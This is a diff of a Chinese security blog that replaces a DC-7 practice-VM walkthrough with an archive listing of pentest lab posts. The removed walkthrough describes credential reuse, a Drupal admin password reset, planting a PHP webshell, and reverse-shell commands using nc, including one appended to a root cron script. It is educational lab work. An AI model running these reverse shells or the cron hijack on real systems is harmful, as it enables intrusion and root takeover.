@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="android">
+    <meta name="keywords" content="Hexo Theme Redefine">
     
     <meta name="author" content="lee">
     
@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://leei.site/2026/02/05/dc7打靶报告/"/>
+    <link rel="canonical" href="https://leei.site/archives/2026/09/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -132,16 +132,14 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="article">
-<meta property="og:title" content="dc7打靶报告">
-<meta property="og:url" content="https://leei.site/2026/02/05/dc7%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Lee&#39;s SecLab">
+<meta property="og:url" content="https://leei.site/archives/2026/09/index.html">
 <meta property="og:site_name" content="Lee&#39;s SecLab">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://leei.site/images/redefine-og.webp">
-<meta property="article:published_time" content="2026-02-04T19:02:10.767Z">
-<meta property="article:modified_time" content="2026-02-05T03:04:46.452Z">
-<meta property="article:author" content="Le_ee 博客等级 码龄1年">
+<meta property="article:author" content="lee">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://leei.site/images/redefine-og.webp">
     
@@ -155,7 +153,7 @@
     
     <title>
         
-            dc7打靶报告 | lee&#39;s seclab
+            Archive: 2026/9 | lee&#39;s seclab
         
     </title>
 
@@ -278,7 +276,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class=""
+                                <a class="active"
                                    href="/archives"
                                         >
                                     <i class="fa-regular fa-archive fa-fw"></i>
@@ -434,7 +432,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                            href="/archives"
                         >
                             <span>
@@ -602,437 +600,226 @@
 			
 
 			<div class="main-content">
-				<div class="post-page-container flex relative justify-between box-border w-full h-full">
-	<div class="article-content-container">
-
-		<div class="article-title relative w-full">
-			
-			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">dc7打靶报告</h1>
-			</div>
-			
-		</div>
-
-		
-		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-				<img src="/images/headshots.png">
-			</div>
-			<div class="info flex flex-col justify-between">
-				<div class="author flex items-center">
-					<span class="name text-default-text-color text-lg font-semibold">Le_ee 博客等级 码龄1年</span>
-					
-					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
-					
-				</div>
-				<div class="meta-info">
-					<div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2026-02-05 03:02:10</span>
-        <span class="mobile">2026-02-05 03:02:10</span>
-        <span class="hover-info">Created</span>
-    </span>
-    
-        <span class="article-date article-meta-item">
-            <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2026-02-05 11:04:46</span>
-            <span class="mobile">2026-02-05 11:04:46</span>
-            <span class="hover-info">Updated</span>
-        </span>
-    
-
-    
-    
-
-    
-    
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
-    
-</div>
-
-				</div>
-			</div>
-		</div>
-		
-
-		
-
-
-		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<meta name="referrer" content="no-referrer"/>
-环境：
-
-<p><strong>攻击机ip</strong>：Kali192.168.145.128</p>
-<p><strong>靶机ip</strong>：192.168.145.189</p>
-<p>信息收集</p>
-<p><code>arp-scan -l</code>，发现存活靶机 192.168.145.189</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6e7cc805d8e14474995cdd441faaac71.png"
-                     
-                ></p>
-<p>识别开放端口和操作系统</p>
-<p><code>nmap -A -p-&amp;#xA0;192.168.145.189</code></p>
-<p>开放端口：22(SSH)、80(HTTP)——cms是drupal 8，服务器是Apache</p>
-<p>操作系统：Linux</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/029e0e194bc64afab1210ffba61a309c.png"
-                     
-                ></p>
-<p>看一下web页面，提示这一关爆破和字典攻击都不一定有用</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ccb9b7a2f2484130888b617d7b63eaee.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e15a3e0819154286ad27f2f7130dc531.png"
-                     
-                ></p>
-<p><code>dirsearch -u http://192.168.145.189 -i 200&amp;#xFF0C;&amp;#x6307;&amp;#x5B9A;&amp;#x72B6;&amp;#x6001;&amp;#x7801;200&amp;#x626B;&amp;#x5B50;url</code></p>
-<p><code>&amp;#x9010;&amp;#x4E2A;&amp;#x5C1D;&amp;#x8BD5;&amp;#x4E00;&amp;#x4E0B;&amp;#xFF0C;&amp;#x53D1;&amp;#x73B0;&amp;#x4EE5;&amp;#x4E0B;&amp;#x51E0;&amp;#x4E2A;&amp;#x9875;&amp;#x9762;&amp;#x6709;&amp;#x6709;&amp;#x7528;&amp;#x56DE;&amp;#x663E;</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/74f6112e69da4ceba55169e743cc6e8d.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a4ed271f91c04cc58d795c91218b20c6.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/9a196e7b875d4f9c8d84d1ef1b1a8414.png"
-                     
-                ></p>
-<p>看到左下角有一个疑似靶场作者留下的标识</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/8a0507b85e9741eeb5087c82c82bab2e.png"
-                     
-                ></p>
-<p>搜一下</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6f717d0ddf5741fbaf80f426f454afa9.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/2992c25960ca4d53b93f53d70016e303.png"
-                     
-                ></p>
-<p>看看存储库里的每个文件，方向对了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/44c2cdda5e9a4b41a648a52aa6fcfcc8.png"
-                     
-                ></p>
-<p>找到一组用户名和密码</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/82dbb327e9844dbeaa5789382353b68e.png"
-                     
-                ></p>
-<p>因为之前开放了22端口，直接用这组密码远程连接试试</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/333be2eb32d546f3838d274b3645ace3.png"
-                     
-                ></p>
-<p>登录成功</p>
-<p>sudo -l试了下用不了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e535d7999e7f4c798951ee68451e9697.png"
-                     
-                ></p>
-<p>ls发现有一个mbox，一个backups</p>
-<p>backups里有两个加密文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7eb191d69fad49a4b36229cdada51391.png"
-                     
-                ></p>
-<p>cat一下mbox发现几个root发的邮件，有一个定时任务</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/38b0a720d0634b97b67379d7bab509fe.png"
-                     
-                ></p>
-<p>大约是15分钟执行一次</p>
-<p>Cron任务执行的 <strong>脚本完整路径</strong>： <code>/opt/scripts/backups.sh</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/10c0c25bb069440eb8f61a54b2edcce0.png"
-                     
-                ></p>
-<p>目前为止，我们还有个网页没有登录进去</p>
-<p>Drupal网站备份数据库 <strong>最常用工具就是drush，</strong> <code>drush</code> 可以 <strong>直接重置Drupal用户密码</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&quot;newpass123&quot;</span><br></pre></td></tr></table></figure></div>
-
-<p>登录成功</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d27bdc1d440e4b74a8bbe4bab95e7a18.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ebfd9329a16749c4b90a0c6ab9a05da8.png"
-                     
-                ></p>
-<p>左下角有一个add content ，我们试试能不能写个马进去，发现文本格式没有php的</p>
-<p>在manage里找到了extend</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f594acacdaae4f588fea78c9c59af87e.png"
-                     
-                ></p>
-<p>安装文本格式php的工具插件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/14c2a57e26ed4fba98684d491be5a4ac.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/64a3a715af7b48729d8d07cb5bd6c732.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/13504944c03d4b51a6578b73c0305751.png"
-                     
-                ></p>
-<p>安装PHP Filter模块</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f7f8727f95d649b5bca713e75e1db8be.png"
-                     
-                ></p>
-<p>再回去artical编辑那里，发现文本形式可以选择php了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ee9e8fea07fb42128e4f4bb001d1d290.png"
-                     
-                ></p>
-<p>写入一句话木马</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/bee49018ff0143198ee0c3a404ffa0a8.png"
-                     
-                ></p>
-<p>保存</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/2f27e0c3269643bfaeb0e8ec33e95d7e.png"
-                     
-                ></p>
-<p>蚁剑成功连接</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/90ae96530b45414283fa08f1a0398762.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/3d7eaa7f02aa43f5a3ec9ccde3896d15.png"
-                     
-                ></p>
-<p><strong>建立反弹shell</strong></p>
-<p><code>kali:nc -lvnp 1234</code></p>
-<p><code>&lt;strong&gt;&amp;#x865A;&amp;#x62DF;&amp;#x7EC8;&amp;#x7AEF;&amp;#xFF1A;&lt;/strong&gt;nc -e /bin/bash 192.168.145.128 1234</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/470e28979cd74d1c934fd5f5d5194d60.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/eb810b4142c641119cd735ecb2983192.png"
-                     
-                ></p>
-<p>然后我们将一段能建立 <strong>反向Shell</strong>的代码追加到 <code>/opt/scripts/backups.sh</code> 文件中，等cron以 <strong>root权限</strong>执行该脚本时，就能获得一个root shell</p>
-<p>echo “rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.145.128 5555 &gt;&#x2F;tmp&#x2F;f” &gt;&gt; &#x2F;opt&#x2F;scripts&#x2F;backups.sh</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;                    # &amp;#x5220;&amp;#x9664;&amp;#x65E7;&amp;#x7684;&amp;#x7BA1;&amp;#x9053;&amp;#x6587;&amp;#x4EF6;&amp;#xFF08;&amp;#x5982;&amp;#x679C;&amp;#x5B58;&amp;#x5728;&amp;#xFF09;</span><br><span class="line">mkfifo /tmp/f;                # &amp;#x521B;&amp;#x5EFA;&amp;#x547D;&amp;#x540D;&amp;#x7BA1;&amp;#x9053;&amp;#x6587;&amp;#x4EF6; /tmp/f</span><br><span class="line">cat /tmp/f |                  # &amp;#x8BFB;&amp;#x53D6;&amp;#x7BA1;&amp;#x9053;&amp;#x5185;&amp;#x5BB9;</span><br><span class="line">/bin/sh -i 2&gt;&amp;1 |             # &amp;#x542F;&amp;#x52A8;&amp;#x4EA4;&amp;#x4E92;&amp;#x5F0F;shell&amp;#xFF0C;&amp;#x5E76;&amp;#x5C06;&amp;#x9519;&amp;#x8BEF;&amp;#x8F93;&amp;#x51FA;&amp;#x91CD;&amp;#x5B9A;&amp;#x5411;&amp;#x5230;&amp;#x6807;&amp;#x51C6;&amp;#x8F93;&amp;#x51FA;</span><br><span class="line">nc 192.168.145.128 5555 &gt; /tmp/f  # &amp;#x8FDE;&amp;#x63A5;&amp;#x5230;&amp;#x653B;&amp;#x51FB;&amp;#x8005;&amp;#x673A;&amp;#x5668;(192.168.145.128:5555)&amp;#xFF0C;&amp;#x5E76;&amp;#x5C06;&amp;#x63A5;&amp;#x6536;&amp;#x5230;&amp;#x7684;&amp;#x6570;&amp;#x636E;&amp;#x5199;&amp;#x5165;&amp;#x7BA1;&amp;#x9053;</span><br></pre></td></tr></table></figure></div>
-
-<p>等待root执行定时任务</p>
-<p><strong>kali监听</strong>： <code>nc -lvnp 5555</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6339c475b3f645db9ea6acde7411476e.png"
-                     
-                ></p>
-<p>完结撒花！！</p>
-
-		</div>
-
-		
-		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-			<div class="article-copyright-info-container">
-    <ul>
-        <li><strong>Title:</strong> dc7打靶报告</li>
-        <li><strong>Author:</strong> Le_ee 博客等级 码龄1年</li>
-        <li><strong>Created at
-                :</strong> 2026-02-05 03:02:10</li>
-        
-            <li>
-                <strong>Updated at
-                    :</strong> 2026-02-05 11:04:46
-            </li>
-        
-        <li>
-            <strong>Link:</strong> https://leei.site/2026/02/05/dc7打靶报告/
-        </li>
-        <li>
-            <strong>
-                License:
-            </strong>
-            
-
-            
-                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
-            
-        </li>
-    </ul>
-</div>
-
-		</div>
-		
-
-		
-
-		
-
-		
-		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2026/02/05/dc8%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">dc8靶机报告</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
-			
-			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2026/01/28/tomato%E9%9D%B6%E6%9C%BAwp/">
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">tomato渗透报告</span>
-						<span class="post-nav-item">Next posts</span>
-					</span>
-					<span class="right arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-right"></i>
-					</span>
-				</a>
-			</div>
-			
-		</div>
-		
-
-
-		
-		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-			<div class="comments-container mt-10 w-full ">
-    <div id="comment-anchor" class="w-full h-2.5"></div>
-    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        Comments
-    </div>
-    
-
-        
-            
-    <div id="waline"></div>
-    <script type="module" data-swup-reload-script>
-      import { init } from '/js/libs/waline.js';
-
-      function loadWaline() {
-        init({
-          el: '#waline',
-          serverURL: 'https://example.example.com',
-          dark: 'body[class~="dark-mode"]',
-          reaction: false,
-          requiredMeta: ['nick', 'mail'],
-          emoji: [],
-                    lang: 'zh-CN',
-        });
-      }
-
-      if (typeof swup !== 'undefined') {
-        loadWaline();
-      } else {
-        window.addEventListener('DOMContentLoaded', loadWaline);
-      }
-    </script>
-
-
-
-        
-    
-</div>
-
-		</div>
-		
-	</div>
-
+				<div class="archive-container shadow-none hover:shadow-none sm:shadow-redefine sm:hover:shadow-redefine-hover">
 	
-	<div class="toc-content-container">
-		<div class="post-toc-wrap">
-	<div class="post-toc">
-		<div class="toc-title">On this page</div>
-		<div class="page-title">dc7打靶报告</div>
-		
-
-	</div>
+<div class="archive-list-container">
+    
+        <section class="archive-item mb-spacing-unit last:mb-0">
+            <div class="archive-item-header flex flex-row items-center mb-2">
+                <span class="archive-year font-semibold text-3xl mr-2">2026</span>
+                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">11</span>
+            </div>
+            
+            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
+                
+                    
+                    
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='09-04'>
+                    
+                    <a href="/2026/09/04/%E7%A7%91%E6%9D%A5%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90+%E7%BB%93%E5%90%88MCP%E8%87%AA%E5%8A%A8%E5%8C%96/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">科来流量分析/结合MCP自动化-CSDN博客</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='07-20'>
+                    
+                    <a href="/2026/07/20/winXP%E6%A0%88%E6%BA%A2%E5%87%BA%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">winXP栈溢出漏洞深度学习</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2026/07/20/cat%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E7%94%9F%E6%88%90/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">cat命令注入绕过检测规则的自动化生成</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='02-05'>
+                    
+                    <a href="/2026/02/05/dc9%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc9打靶报告</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2026/02/05/dc8%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc8靶机报告</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2026/02/05/dc7%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc7打靶报告</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='01-28'>
+                    
+                    <a href="/2026/01/28/tomato%E9%9D%B6%E6%9C%BAwp/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">tomato渗透报告</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2026/01/28/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc6/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc6打靶报告</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2026/01/28/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc5/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc5靶机报告</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2026/01/28/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc4/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc4打靶报告</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2026/01/28/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc3/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc3靶机报告</span>
+                    </a>
+                    
+                
+                </li> <!-- Ensure the last item is properly closed -->
+            </ul>
+        </section>
+    
+        <section class="archive-item mb-spacing-unit last:mb-0">
+            <div class="archive-item-header flex flex-row items-center mb-2">
+                <span class="archive-year font-semibold text-3xl mr-2">2025</span>
+                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">9</span>
+            </div>
+            
+            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
+                
+                    
+                    
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='11-27'>
+                    
+                    <a href="/2025/11/27/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc2/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc系列——dc2</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='11-24'>
+                    
+                    <a href="/2025/11/24/linux%E5%8C%85%E7%AE%A1%E7%90%86/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">Linux 软件包管理教程</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='11-18'>
+                    
+                    <a href="/2025/11/18/rocky%20linux%208%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">RockyLinux8网络配置</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='11-02'>
+                    
+                    <a href="/2025/11/02/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc1/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">dc系列靶机——dc1</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-31'>
+                    
+                    <a href="/2025/10/31/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BAweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">红日靶场web服务器渗透</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-29'>
+                    
+                    <a href="/2025/10/29/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">端口转发实操</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2025/10/29/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">永恒之蓝复现</span>
+                    </a>
+                    
+                
+                    
+                    
+                    <a href="/2025/10/29/REI%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">REI——远程文件包含</span>
+                    </a>
+                    
+                
+                    
+                    
+                        
+                            </li>
+                         <!-- Close the previous LI if not the first item -->
+                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-28'>
+                    
+                    <a href="/2025/10/28/%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BB%8EMSF%E8%BD%BD%E8%8D%B7%E7%94%9F%E6%88%90%E5%88%B0Windows%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87/" class="block w-fit">
+                        <span class="article-title my-0.5 text-2xl">实战笔记：从MSF载荷生成到Windows防火墙绕过</span>
+                    </a>
+                    
+                
+                </li> <!-- Ensure the last item is properly closed -->
+            </ul>
+        </section>
+    
 </div>
-	</div>
-	
 </div>
 			</div>
 
@@ -1111,26 +898,6 @@
 		</div>
 	</div>
 
-	
-	<div class="post-tools">
-		<div class="post-tools-container">
-	<ul class="article-tools-list">
-		<!-- TOC aside toggle -->
-		
-		<li class="right-bottom-tools page-aside-toggle">
-			<i class="fa-regular fa-outdent"></i>
-		</li>
-		
-
-		<!-- go comment -->
-		
-		<li class="go-comment">
-			<i class="fa-regular fa-comments"></i>
-		</li>
-		
-	</ul>
-</div>
-	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -1234,7 +1001,6 @@
         containers: ["#swup"],
     });
 </script>
-
 
 
 
